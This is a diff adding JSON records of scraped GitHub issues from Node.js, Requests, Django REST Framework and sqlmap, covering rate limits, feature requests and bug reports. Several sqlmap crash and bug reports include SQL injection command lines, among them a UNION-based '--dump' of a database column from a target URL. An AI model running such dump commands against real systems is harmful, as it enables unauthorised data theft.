+    "title": "Time sensitive: GitHub Actions Cache rate limits (from GitHub staff)",
+    "description": "To preserve the health of our services and reliably serve all GitHub Actions Cache users, the following rate limit will take effect immediately: \n\n[200 cache entry uploads per minute per repository](https://github.blog/changelog/2026-01-16-rate-limiting-for-actions-cache-entries/).\n\nIf you exceed this limit, you will receive a 429 response and an error message indicating that you have exceeded the rate limit. \n\nYou should not retry your request until after the time specified in the `Retry-After` header has passed. If your request continues to fail due to this rate limit, implement exponential backoff between retries, and throw an error after a specific number of retries.\n\nThis limit helps prevent abuse and denial-of-service attacks and ensures that the service remains available for all users. \n\n> [!IMPORTANT]\n> Introduce the needed changes to your library so that the rate limit errors are retried as per the recommended schedule. \n\n### Update your actions and libs\n\nIf you are using any of the following actions or depend on any of these libraries:\n- https://github.com/mozilla-actions/sccache-action\n- https://github.com/mozilla/sccache\n- https://github.com/apache/opendal\n- https://github.com/DeterminateSystems/magic-nix-cache\n\nIntroduce the needed changes to maintain a high cache hit/miss ratio, or follow-up with the authors of those libraries on the progress of these changes.\n\n### Thrashing\n\nIt has also come to our attention that a substantial number of repositories adopting this library (or action) are exhibiting consistent cache thrashing behavior. \n\nCache thrashing occurs when cache entries are frequently evicted and re-created in a continuous cycle, preventing effective cache utilization. This happens when your workflow generates more cache data than can be stored within your available cache storage quota. \n\nBy default, GitHub Actions provides *10 GB of cache storage per repository*. When this limit is reached, GitHub automatically evicts the least recently used cache entries to make room for new ones. If your workflows consistently produce cache data that exceeds this limit, the cache is constantly being written and evicted—resulting in thrashing. \n\nThis leads to: \n\n- Wasted compute time spent creating caches that are immediately evicted \n- Increased network bandwidth consumption \n- Little to no performance benefit from caching \n\nTo avoid thrashing, consider increasing your cache storage limit. For more information, see [\"Usage limits and eviction policy.\"](https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching#usage-limits-and-eviction-policy)",
+    "labels": [
+      "help wanted",
+      "meta"
+    ],
+    "state": "closed",
+    "created_at": "2026-01-19T10:01:40+00:00",
+    "closed_at": "2026-04-10T18:22:54+00:00",
+    "url": "https://github.com/nodejs/node/issues/61436",
+    "language": "JavaScript",
+    "author": "Link-",
+    "comments_count": 31,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "nodejs/node",
+    "issue_number": 62529,
+    "title": "Add support for generating UUIDv7s",
+    "description": "### What is the problem this feature will solve?\n\nUUIDv7s are time-based UUIDs which can be helpful for sorting & database distribution. The standard is published here: https://datatracker.ietf.org/doc/html/rfc9562#name-uuid-version-7\n\nPostgres [recently shipped](https://www.postgresql.org/docs/current/functions-uuid.html) native support for UUIDv7 generation, and Bun [has a helper](https://bun.com/docs/guides/util/javascript-uuid) `Bun.randomUUIDv7();`\n\nHaving to reach for a library in order to generate non-v4 UUIDs is a bummer and adds bloat for a very common workflow.\n\n### What is the feature you are proposing to solve the problem?\n\nI'm proposing UUIDv7 generation support be included in the Crypto module. \n\nThe actual API for this could either follow Bun's path of a separate method `.createRandomUUIDv7()`, or add in a property to the [existing](https://nodejs.org/api/crypto.html#cryptorandomuuidoptions) `createRandomUUID` `options` parameter such as `version`. These are not mutually exclusive, and you could imagine the parameter & method both existing for convenience.\n\nExamples:\n\n```js\nconst {\n  createRandomUUIDv7,\n  createRandomUUID\n} = await import('node:crypto');\n\ncreateRandomUUIDv7();\n// => \"019d45ea-151f-780b-82a6-d097b39db62a\"\n\ncreateRandomUUID({\n  version: \"v7\"\n});\n// => \"019d45ea-fc8e-7792-bfa1-ae58916be0e3\"\n```\n\n### What alternatives have you considered?\n\n_No response_",
+    "labels": [
+      "crypto",
+      "feature request"
+    ],
+    "state": "closed",
+    "created_at": "2026-03-31T22:05:11+00:00",
+    "closed_at": "2026-04-05T10:12:24+00:00",
+    "url": "https://github.com/nodejs/node/issues/62529",
+    "language": "JavaScript",
+    "author": "jreidgreer",
+    "comments_count": 6,
+    "code_snippets": [
+      {
+        "code": "const {\n  createRandomUUIDv7,\n  createRandomUUID\n} = await import('node:crypto');\n\ncreateRandomUUIDv7();\n// => \"019d45ea-151f-780b-82a6-d097b39db62a\"\n\ncreateRandomUUID({\n  version: \"v7\"\n});\n// => \"019d45ea-fc8e-7792-bfa1-ae58916be0e3\"",
+        "language": "js"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "nodejs/node",
+    "issue_number": 62434,
+    "title": "[FR] Disable eval() usage by default",
+    "description": "### What is the problem this feature will solve?\n\n`eval() `and `Function() `in Node.js allow executing arbitrary code at runtime. While powerful, they are a common vector for security vulnerabilities and accidental code injection. Currently, `eval()` is enabled by default, which means that even minor mistakes or untrusted dependencies can execute code dynamically, increasing security risks.\n\nBy disabling `eval()` by default, Node.js can provide a safer runtime out of the box. This change encourages developers to use safer alternatives such as vm or strict sandboxing, reducing potential attack surfaces in Node.js applications.\n\nAs you can see in this [commit](https://github.com/midudev/preguntas-entrevista-react/commit/72c3e5a2684108db9af3fccbc4d09b2356c74e0d#diff-0a9670300d2139e7a1a7e37ace2536b0d0c890c7681dcaa12d3e410d72547f8e), you can somehow insert arbitrary code on a commit and not even notice.\n\nThis [video](https://www.youtube.com/watch?v=ikdCG4goKIE) (in spanish, by @midudev), explains how they attacked him through this method. Is crazy\n\n### What is the feature you are proposing to solve the problem?\n\nIntroduce a new opt-in flag --enable-eval in Node.js.\n- Default behavior: eval() and Function() are disabled in the runtime. Any attempt to use them without the flag will throw an error.\n- Opt-in: Users can explicitly enable eval() for legacy applications or specific use cases by passing `node --enable-eval index.js`\n- Benefits:\n\n- - Improves default security for Node.js applications.\n- - Prevents accidental dynamic code execution in production.\n- - Allows developers to consciously decide when they need eval().",
+    "labels": [
+      "feature request"
+    ],
+    "state": "closed",
+    "created_at": "2026-03-25T18:47:07+00:00",
+    "closed_at": "2026-04-07T16:44:56+00:00",
+    "url": "https://github.com/nodejs/node/issues/62434",
+    "language": "JavaScript",
+    "author": "PR3C14D0",
+    "comments_count": 8,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "psf/requests",
+    "issue_number": 6578,
+    "title": "Weird behaviour with https and proxy authentication",
+    "description": "<!-- Summary. -->\r\n\r\nrequests.get is getting weird with some combinations of dictionary keys and proxy authentication.\r\n\r\n## Expected Result\r\n```python\r\nprint(requests.get('https://google.com', proxies={\"https\" : 'https://user:pass@ip:port'}))\r\n```\r\nOutput:\r\n`<Response [200]>`\r\n<!-- What you expected. -->\r\n\r\n## Actual Result\r\nDoesn't run? (Maybe timeout)\r\nBut it somehow fixes itself with these changes\r\n```python\r\nprint(requests.get('https://google.com', proxies={\"http\" : 'http://user:pass@ip:port'}))\r\n```\r\n\r\nOutput:\r\n`<Response [200]>`\r\n<!-- What happened instead. -->\r\n\r\n## Reproduction Steps\r\n\r\n```python\r\nimport requests\r\n\r\nprint(requests.get('https://google.com', proxies={\"https\" : 'https://user:pass@ip:port'}))\r\n\r\nprint(requests.get('https://google.com', proxies={\"http\" : 'http://user:pass@ip:port'}))\r\n```\r\n\r\n## System Information\r\n\r\n    $ python -m requests.help\r\n\r\n```json\r\n{\r\n  \"chardet\": {\r\n    \"version\": null\r\n  },\r\n  \"charset_normalizer\": {\r\n    \"version\": \"2.0.12\"\r\n  },\r\n  \"cryptography\": {\r\n    \"version\": \"\"\r\n  },\r\n  \"idna\": {\r\n    \"version\": \"3.4\"\r\n  },\r\n  \"implementation\": {\r\n    \"name\": \"CPython\",\r\n    \"version\": \"3.10.11\"\r\n  },\r\n  \"platform\": {\r\n    \"release\": \"10\",\r\n    \"system\": \"Windows\"\r\n  },\r\n  \"pyOpenSSL\": {\r\n    \"openssl_version\": \"\",\r\n    \"version\": null\r\n  },\r\n  \"requests\": {\r\n    \"version\": \"2.27.1\"\r\n  },\r\n  \"system_ssl\": {\r\n    \"version\": \"1010114f\"\r\n  },\r\n  \"urllib3\": {\r\n    \"version\": \"1.26.9\"\r\n  },\r\n  \"using_charset_normalizer\": true,\r\n  \"using_pyopenssl\": false\r\n}\r\n````\r\n    $ python --version\r\n    Python 3.10.11\r\n\r\n\r\n\r\n<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,\r\nplease provide some basic information about your system (Python version,\r\noperating system, &c). -->\r\n",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2023-11-19T00:56:06+00:00",
+    "closed_at": "2026-04-04T19:08:21+00:00",
+    "url": "https://github.com/psf/requests/issues/6578",
+    "language": "Python",
+    "author": "sigscanner",
+    "comments_count": 5,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "psf/requests",
+    "issue_number": 6784,
+    "title": "Multiple path separators causes bad requests ",
+    "description": "<!-- Summary. -->\r\nI'm assuming that change in https://github.com/psf/requests/pull/6644 is the cause of this changed behavior that operations with // in path fails. It seems to be related to Authentication as it is the only thing I could find that does not get trimmed by the change in 6644.\r\n\r\n## Expected Result\r\n\r\nSimilar behavior as before 2.32.0\r\n\r\n## Actual Result\r\n\r\nRequest captured by wireshark, note that this is the second request as the first got a 401\r\n\r\nHypertext Transfer Protocol\r\n    POST /axis-cgi/capturemode.cgi HTTP/1.1\\r\\n\r\n    Host: 192.168.0.1\\r\\n\r\n    User-Agent: python-requests/2.32.3\\r\\n\r\n    Accept-Encoding: gzip, deflate, zstd\\r\\n\r\n    Accept: */*\\r\\n\r\n    Connection: keep-alive\\r\\n\r\n    Content-Length: 50\\r\\n\r\n     [truncated]Authorization: Digest username=\"root\", realm=\"AXIS_B8A44F45D62F\", nonce=\"UKH3vekeBgA=2b0d57c2d8b8eb15307576e30309cb7b23a2304c\", uri=\"//axis-cgi/capturemode.cgi\", response=\"0a51943f746a0d88c6574f662b457a9c\", algorithm=\"MD5\", qo\r\n         username=\"root\"\r\n         realm=\"AXIS_B8A44F45D62F\"\r\n         nonce=\"UKH3vekeBgA=2b0d57c2d8b8eb15307576e30309cb7b23a2304c\"\r\n         uri=\"//axis-cgi/capturemode.cgi\"\r\n         response=\"0a51943f746a0d88c6574f662b457a9c\"\r\n         algorithm=\"MD5\"\r\n         qop=\"auth\"\r\n         nc=00000001\r\n    \\r\\n\r\n    [Full request URI: http://172.26.21.128/axis-cgi/capturemode.cgi]\r\n    [HTTP request 2/2]\r\n    [Prev request in frame: 10]\r\n    [Response in frame: 19]\r\n    File Data: 50 bytes\r\n    Data (50 bytes)\r\n\r\nResponse:\r\nHypertext Transfer Protocol\r\n    HTTP/1.1 400 Bad Request\\r\\n\r\n    Date: Mon, 05 Aug 2024 06:25:23 GMT\\r\\n\r\n    Server: Apache/2.4.58 (Unix) OpenSSL/3.0.13\\r\\n\r\n    X-Content-Type-Options: nosniff\\r\\n\r\n    X-Frame-Options: SAMEORIGIN\\r\\n\r\n    X-XSS-Protection: 1; mode=block\\r\\n\r\n     [truncated]Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; connect-src 'self' https://*.google-analytics.com https://*.analytics.google.com https://*.googletagmanager.com https://*.axis.com mediastream: blob:; script\r\n    Content-Length: 226\\r\\n\r\n    Connection: close\\r\\n\r\n    Content-Type: text/html; charset=iso-8859-1\\r\\n\r\n    \\r\\n\r\n    [HTTP response 2/2]\r\n    [Time since request: 0.001411000 seconds]\r\n    [Prev request in frame: 10]\r\n    [Prev response in frame: 13]\r\n    [Request in frame: 16]\r\n    [Request URI: http://192.168.0.1/axis-cgi/capturemode.cgi]\r\n    File Data: 226 bytes\r\n\r\n## Reproduction Steps\r\nThis was run at a axis camera\r\n\r\n```python\r\nimport requests\r\n\r\nurl = \"http://192.168.01//axis-cgi/capturemode.cgi\"\r\nbody = {\r\n            \"apiVersion\": \"1.0\",\r\n            \"method\": \"getCaptureModes\"}\r\n\r\nauth = requests.auth.HTTPDigestAuth(\"root\", \"pass\")\r\nresponse = requests.post(url=url, data=json.dumps(body),\r\n                                              auth=auth, proxies=dict(http=None, https=None))\r\n```\r\n\r\n## System Information\r\n\r\n    $ python -m requests.help\r\n\r\n```json\r\n{\r\n  \"chardet\": {\r\n    \"version\": null\r\n  },\r\n  \"charset_normalizer\": {\r\n    ",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2024-08-05T07:15:00+00:00",
+    "closed_at": "2026-04-04T19:03:50+00:00",
+    "url": "https://github.com/psf/requests/issues/6784",
+    "language": "Python",
+    "author": "martin-pil",
+    "comments_count": 1,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "psf/requests",
+    "issue_number": 7324,
+    "title": "<spam>",
+    "description": "## Vulnerability Report\n\nHi there! We found 3 known vulnerabilities in this project's dependencies during a routine open-source security scan.\n\n| CVE | Package | Current | Fixed | Severity | CVSS | EPSS |\n|-----|---------|---------|-------|----------|------|------|\n| [CVE-2024-3651](https://nvd.nist.gov/vuln/detail/CVE-2024-3651) | `idna` | 2.5 | 3.7 | HIGH | 7.5 | 0.67% |\n| [CVE-2026-21441](https://nvd.nist.gov/vuln/detail/CVE-2026-21441) | `urllib3` | 1.26 | 2.6.3 | HIGH | 7.5 | 0.03% |\n| [CVE-2021-33503](https://nvd.nist.gov/vuln/detail/CVE-2021-33503) | `urllib3` | 1.26 | 1.26.5 | HIGH | 7.5 | 0.86% |\n\n<details>\n<summary>Detailed analysis</summary>\n\n### CVE-2024-3651 — `idna@2.5`\n\n**Internationalized Domain Names in Applications (IDNA) vulnerable to denial of service from specially crafted inputs to idna.encode**\n\n> A vulnerability was identified in the kjd/idna library, specifically within the `idna.encode()` function, affecting version 3.6. The issue arises from the function's handling of crafted input strings, which can lead to quadratic complexity and consequently, a denial of service condition. This vulner...\n\n- **Priority:** HIGH\n- **Recommended action:** SCHEDULE PATCH\n- **Reasoning:** CVSS 7.5 with network-accessible DoS vector (AV:N/AC:L/PR:N/UI:N) indicates significant risk despite scanner's LOW severity rating. Package version 2.5 is vulnerable while fix available in 3.7. Low EPSS (0.0067) and no KEV listing reduce urgency slightly, but the ease of exploitation warrants prompt patching.\n\n### CVE-2026-21441 — `urllib3@1.26`\n\n**Decompression-bomb safeguards bypassed when following HTTP redirects (streaming API)**\n\n> urllib3 is an HTTP client library for Python. urllib3's streaming API is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once. urllib3 can perform decoding or decompression based on the HTTP `Co...\n\n- **Priority:** HIGH\n- **Recommended action:** SCHEDULE PATCH\n- **Reasoning:** CVSS 7.5 indicates high severity despite scanner's LOW rating. Network-accessible DoS vulnerability in widely-used urllib3 library affecting streaming API. Very low EPSS (0.00027) suggests minimal exploitation likelihood currently, but the attack vector requires no authentication or user interaction. Patch available in v2.6.3 with workaround option to disable redirects.\n\n### CVE-2021-33503 — `urllib3@1.26`\n\n**Catastrophic backtracking in URL authority parser when passed URL containing many @ characters**\n\n> An issue was discovered in urllib3 before 1.26.5. When provided with a URL containing many @ characters in the authority component, the authority regular expression exhibits catastrophic backtracking, causing a denial of service if a URL were passed as a parameter or redirected to via an HTTP redire...\n\n- **Priority:** HIGH\n- **Recommended action:** SCHEDULE PATCH\n- **Reasoning:** CVSS 7.5 indicates high severity DoS vulnerability with networ",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2026-04-04T02:11:46+00:00",
+    "closed_at": "2026-04-04T02:12:41+00:00",
+    "url": "https://github.com/psf/requests/issues/7324",
+    "language": "Python",
+    "author": "devbrewster",
+    "comments_count": 0,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": true
+  },
+  {
+    "repository": "encode/django-rest-framework",
+    "issue_number": 9574,
+    "title": "Disallow custom authentication class to return user = `None`",
+    "description": "Hello there!\r\nCurrently it's allowed that an custom authentication class returns a tuple containing `(None, None)`. This causes the authentication to be considered successful and sets `request.user = None` and this can cause errors that are hard to track where they came from.\r\nI know that this wrongly implemented by the `CustomAuthentication` class, the user should've raised an `AuthenticationFailed` exception instead. But this allows the user to shoot itself on the foot.\r\n\r\nExample of a bad implemented authentication class:\r\n```python\r\nfrom rest_framework.authentication import BaseAuthentication\r\n\r\nclass MyDumbAuthentication(BaseAuthentication):\r\n  def authenticate(self, request):\r\n    return None, None\r\n```\r\n\r\nLater if you have a permission check for example, you would see the following error:\r\n```python\r\nfrom rest_framework.permissions import BasePermission\r\n\r\nclass MyPermCheck(BasePermission):\r\n  def has_permission(self, request, view):\r\n    return request.user.has_perm(\"foo.bar\")\r\n\r\n# raises AttributeError(\"'NoneType' object has no attribute 'has_perm'\")\r\n```\r\n\r\nIt would be nice if rest framework disallowed this totally wrong implementation.\r\n\r\n## Checklist\r\n\r\n- [x] Raised initially as discussion\r\n- [x] This is not a feature request suitable for implementation outside this project. Please elaborate what it is:\r\n  - [ ] compatibility fix for new Django/Python version ...\r\n  - [x] other type of bug fix\r\n  - [ ] other type of improvement that does not touch existing code or change existing behavior (e.g. wrapper for new Django field)\r\n- [x] I have reduced the issue to the simplest possible case.\r\n",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2024-10-23T14:36:15+00:00",
+    "closed_at": "2026-02-24T19:07:40+00:00",
+    "url": "https://github.com/encode/django-rest-framework/issues/9574",
+    "language": "Python",
+    "author": "leandrodesouzadev",
+    "comments_count": 7,
+    "code_snippets": [],
+    "has_code": false,
+    "is_spam": false
+  },
+  {
+    "repository": "sqlmapproject/sqlmap",
+    "issue_number": 6043,
+    "title": "Unhandled exception (#5decc5eb)",
+    "description": "```\nRunning version: 1.10.3.11#dev\nPython version: 3.13.12\nOperating system: Linux-6.18.12+kali-amd64-x86_64-with-glibc2.42\nCommand line: sqlmap.py -d firebird://SYSDBA:masterkey@127.0.0.1:3050///tmp/testdb.fdb --dump --batch\nTechnique: DIRECT\nBack-end DBMS: Firebird (identified)\n```\n```\nTraceback (most recent call last):\nFile \"sqlmap.py\", line 222, in main\nstart()\n~~~~~^^\nFile \"lib/core/decorators.py\", line 99, in _\nresult = f(*args, **kwargs)\nFile \"lib/controller/controller.py\", line 281, in start\naction()\n~~~~~~^^\nFile \"lib/controller/action.py\", line 33, in action\nsetHandler()\n~~~~~~~~~~^^\nFile \"lib/controller/handler.py\", line 156, in setHandler\nconf.dbmsConnector.connect()\n~~~~~~~~~~~~~~~~~~~~~~~~~~^^\nFile \"plugins/dbms/firebird/connector.py\", line 41, in connect\nself.connector = kinterbasdb.connect(host=self.hostname.encode(UNICODE_ENCODING), database=self.db.encode(UNICODE_ENCODING), user=self.user.encode(UNICODE_ENCODING), password=self.password.encode(UNICODE_ENCODING), charset=\"UTF8\")\n~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nFile \"/fdb/fbcore.py\", line 825, in connect\nif host and host.endswith(':'):\n~~~~~~~~~~~~~^^^^^\nTypeError: endswith first arg must be bytes or a tuple of bytes, not str\n```",
+    "labels": [],
+    "state": "closed",
+    "created_at": "2026-04-09T01:09:27+00:00",
+    "closed_at": "2026-04-09T16:04:47+00:00",
+    "url": "https://github.com/sqlmapproject/sqlmap/issues/6043",
+    "language": "Python",
+    "author": "sqlmapreporter",
+    "comments_count": 0,
+    "code_snippets": [
+      {
+        "code": "Running version: 1.10.3.11#dev\nPython version: 3.13.12\nOperating system: Linux-6.18.12+kali-amd64-x86_64-with-glibc2.42\nCommand line: sqlmap.py -d firebird://SYSDBA:masterkey@127.0.0.1:3050///tmp/testdb.fdb --dump --batch\nTechnique: DIRECT\nBack-end DBMS: Firebird (identified)",
+        "language": "unknown"
+      },
+      {
+        "code": "Traceback (most recent call last):\nFile \"sqlmap.py\", line 222, in main\nstart()\n~~~~~^^\nFile \"lib/core/decorators.py\", line 99, in _\nresult = f(*args, **kwargs)\nFile \"lib/controller/controller.py\", line 281, in start\naction()\n~~~~~~^^\nFile \"lib/controller/action.py\", line 33, in action\nsetHandler()\n~~~~~~~~~~^^\nFile \"lib/controller/handler.py\", line 156, in setHandler\nconf.dbmsConnector.connect()\n~~~~~~~~~~~~~~~~~~~~~~~~~~^^\nFile \"plugins/dbms/firebird/connector.py\", line 41, in connect\nself.connector = kinterbasdb.connect(host=self.hostname.encode(UNICODE_ENCODING), database=self.db.encode(UNICODE_ENCODING), user=self.user.encode(UNICODE_ENCODING), password=self.password.encode(UNICODE_ENCODING), charset=\"UTF8\")\n~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nFile \"/fdb/fbcore.py\", line 825, in connect\nif host and host.endswith(':'):\n~~~~~~~~~~~~~^^^^^\nTypeError: endswith first arg must be bytes or a tuple of bytes, not str",
+        "language": "unknown"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "sqlmapproject/sqlmap",
+    "issue_number": 6041,
+    "title": "Unhandled exception (#47c73646)",
+    "description": "```\nRunning version: 1.9.9.4#dev\nPython version: 3.7.8rc1\nOperating system: Windows-10-10.0.26100-SP0\nCommand line: .\\sqlmap1.9.5.py -r .\\1.txt\nTechnique: UNION\nBack-end DBMS: None\n```\n```\nTraceback (most recent call last):\n  File \"sqlmap1.9.5.py\", line 222, in main\n    start()\n  File \"lib/core/decorators.py\", line 84, in _\n    result = f(*args, **kwargs)\n  File \"lib/controller/controller.py\", line 607, in start\n    injection = checkSqlInjection(place, parameter, value)\n  File \"lib/controller/checks.py\", line 520, in checkSqlInjection\n    ratio *= seqMatcher.quick_ratio()\n  File \"D:/python3/lib/difflib.py\", line 660, in quick_ratio\n    fullbcount[elt] = fullbcount.get(elt, 0) + 1\nTypeError: unsupported operand type(s) for +: 'str_iterator' and 'int'\n```",
+    "labels": [
+      "duplicate"
+    ],
+    "state": "closed",
+    "created_at": "2026-04-03T05:41:34+00:00",
+    "closed_at": "2026-04-03T10:29:41+00:00",
+    "url": "https://github.com/sqlmapproject/sqlmap/issues/6041",
+    "language": "Python",
+    "author": "sqlmapreporter",
+    "comments_count": 1,
+    "code_snippets": [
+      {
+        "code": "Running version: 1.9.9.4#dev\nPython version: 3.7.8rc1\nOperating system: Windows-10-10.0.26100-SP0\nCommand line: .\\sqlmap1.9.5.py -r .\\1.txt\nTechnique: UNION\nBack-end DBMS: None",
+        "language": "unknown"
+      },
+      {
+        "code": "Traceback (most recent call last):\n  File \"sqlmap1.9.5.py\", line 222, in main\n    start()\n  File \"lib/core/decorators.py\", line 84, in _\n    result = f(*args, **kwargs)\n  File \"lib/controller/controller.py\", line 607, in start\n    injection = checkSqlInjection(place, parameter, value)\n  File \"lib/controller/checks.py\", line 520, in checkSqlInjection\n    ratio *= seqMatcher.quick_ratio()\n  File \"D:/python3/lib/difflib.py\", line 660, in quick_ratio\n    fullbcount[elt] = fullbcount.get(elt, 0) + 1\nTypeError: unsupported operand type(s) for +: 'str_iterator' and 'int'",
+        "language": "unknown"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "sqlmapproject/sqlmap",
+    "issue_number": 6039,
+    "title": "Unhandled exception (#a3b19873)",
+    "description": "```\nRunning version: 1.9.9.4#dev\nPython version: 3.7.8rc1\nOperating system: Windows-10-10.0.26100-SP0\nCommand line: .\\sqlmap1.9.5.py -r .\\1.txt\nTechnique: UNION\nBack-end DBMS: None\n```\n```\nTraceback (most recent call last):\n  File \"sqlmap1.9.5.py\", line 222, in main\n    start()\n  File \"lib/core/decorators.py\", line 84, in _\n    result = f(*args, **kwargs)\n  File \"lib/controller/controller.py\", line 607, in start\n    injection = checkSqlInjection(place, parameter, value)\n  File \"lib/controller/checks.py\", line 130, in checkSqlInjection\n    tests = getSortedInjectionTests()\n  File \"lib/core/common.py\", line 3750, in getSortedInjectionTests\n    retVal = copy.deepcopy(conf.tests)\n  File \"D:/python3/lib/copy.py\", line 150, in deepcopy\n    y = copier(x, memo)\n  File \"D:/python3/lib/copy.py\", line 216, in _deepcopy_list\n    append(deepcopy(a, memo))\n  File \"D:/python3/lib/copy.py\", line 161, in deepcopy\n    y = copier(memo)\n  File \"lib/core/datatype.py\", line 100, in __deepcopy__\n    retVal.__setitem__(key, copy.deepcopy(value, memo))\n  File \"D:/python3/lib/copy.py\", line 185, in deepcopy\n    _keep_alive(x, memo) # Make sure x lives at least as long as d\n  File \"D:/python3/lib/copy.py\", line 264, in _keep_alive\n    memo[id(memo)].append(x)\nTypeError: unhashable type: 'list'\n```",
+    "labels": [
+      "unreproducible"
+    ],
+    "state": "closed",
+    "created_at": "2026-03-30T02:23:56+00:00",
+    "closed_at": "2026-03-30T09:53:54+00:00",
+    "url": "https://github.com/sqlmapproject/sqlmap/issues/6039",
+    "language": "Python",
+    "author": "sqlmapreporter",
+    "comments_count": 3,
+    "code_snippets": [
+      {
+        "code": "Running version: 1.9.9.4#dev\nPython version: 3.7.8rc1\nOperating system: Windows-10-10.0.26100-SP0\nCommand line: .\\sqlmap1.9.5.py -r .\\1.txt\nTechnique: UNION\nBack-end DBMS: None",
+        "language": "unknown"
+      },
+      {
+        "code": "Traceback (most recent call last):\n  File \"sqlmap1.9.5.py\", line 222, in main\n    start()\n  File \"lib/core/decorators.py\", line 84, in _\n    result = f(*args, **kwargs)\n  File \"lib/controller/controller.py\", line 607, in start\n    injection = checkSqlInjection(place, parameter, value)\n  File \"lib/controller/checks.py\", line 130, in checkSqlInjection\n    tests = getSortedInjectionTests()\n  File \"lib/core/common.py\", line 3750, in getSortedInjectionTests\n    retVal = copy.deepcopy(conf.tests)\n  File \"D:/python3/lib/copy.py\", line 150, in deepcopy\n    y = copier(x, memo)\n  File \"D:/python3/lib/copy.py\", line 216, in _deepcopy_list\n    append(deepcopy(a, memo))\n  File \"D:/python3/lib/copy.py\", line 161, in deepcopy\n    y = copier(memo)\n  File \"lib/core/datatype.py\", line 100, in __deepcopy__\n    retVal.__setitem__(key, copy.deepcopy(value, memo))\n  File \"D:/python3/lib/copy.py\", line 185, in deepcopy\n    _keep_alive(x, memo) # Make sure x lives at least as long as d\n  File \"D:/python3/lib/copy.py\", line 264, in _keep_alive\n    memo[id(memo)].append(x)\nTypeError: unhashable type: 'list'",
+        "language": "unknown"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "sqlmapproject/sqlmap",
+    "issue_number": 6032,
+    "title": "SQLMap fails to dump LONGTEXT/XML column via UNION (truncated output / SQL syntax errors)",
+    "description": "### Description\n\nWhen dumping a column containing large XML/JSON data, sqlmap detects a working UNION injection but fails to dump the column correctly. The tool reports truncated output or SQL syntax errors.\n\n### Environment\n\n* sqlmap version: (e.g. 1.8.x / latest from GitHub)\n* Python version: (e.g. Python 3.12)\n* OS: Windows 10\n* DBMS: MySQL\n* Injection type detected: UNION query (NULL) – 20 columns\n\n### Command used\n\n```\nsqlmap -u \"TARGET_URL\" \\\n--technique=U \\\n--union-cols=20 \\\n--threads=5 \\\n-D DATABASE -T TABLE -C COLUMN \\\n--dump\n```\n\n### Observed behavior\n\nsqlmap detects UNION injection successfully:\n\n```\nType: UNION query\nTitle: MySQL UNION query (NULL) - 20 columns\n```\n\nHowever when dumping the column containing large XML/JSON data, sqlmap returns errors such as:\n\n```\npossible server trimmed output detected (probably due to its length and/or content)\n```\n\nand sometimes:\n\n```\nUncaught mysqli_sql_exception: You have an error in your SQL syntax near '[{\"xml\": \"<?xml version=\"1.0\"...'\n```\n\n### Workaround\n\nUsing boolean-based extraction works:\n\n```\n--technique=B\n```\n\nBut the extraction becomes extremely slow.\n\n### Expected behavior\n\nSince UNION-based injection is confirmed working, sqlmap should ideally handle long column values (XML/JSON) without truncation or syntax errors, or automatically switch to a safer extraction method.\n\n### Additional information\n\nThe column contains serialized API responses beginning with:\n\n```\n[{\"xml\": \"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n```\n\nwhich may exceed the HTTP response length or break SQL syntax during UNION extraction.\n",
+    "labels": [
+      "bug report"
+    ],
+    "state": "closed",
+    "created_at": "2026-03-12T09:04:47+00:00",
+    "closed_at": "2026-03-30T11:25:47+00:00",
+    "url": "https://github.com/sqlmapproject/sqlmap/issues/6032",
+    "language": "Python",
+    "author": "hos903",
+    "comments_count": 0,
+    "code_snippets": [
+      {
+        "code": "sqlmap -u \"TARGET_URL\" \\\n--technique=U \\\n--union-cols=20 \\\n--threads=5 \\\n-D DATABASE -T TABLE -C COLUMN \\\n--dump",
+        "language": "unknown"
+      },
+      {
+        "code": "Type: UNION query\nTitle: MySQL UNION query (NULL) - 20 columns",
+        "language": "unknown"
+      },
+      {
+        "code": "possible server trimmed output detected (probably due to its length and/or content)",
+        "language": "unknown"
+      },
+      {
+        "code": "Uncaught mysqli_sql_exception: You have an error in your SQL syntax near '[{\"xml\": \"<?xml version=\"1.0\"...'",
+        "language": "unknown"
+      },
+      {
+        "code": "--technique=B",
+        "language": "unknown"
+      },
+      {
+        "code": "[{\"xml\": \"<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
+        "language": "unknown"
+      }
+    ],
+    "has_code": true,
+    "is_spam": false
+  },
+  {
+    "repository": "sqlmapproject/sqlmap",
+    "issue_number": 6040,
+    "title": "Unhandled exception (#77451cec)",
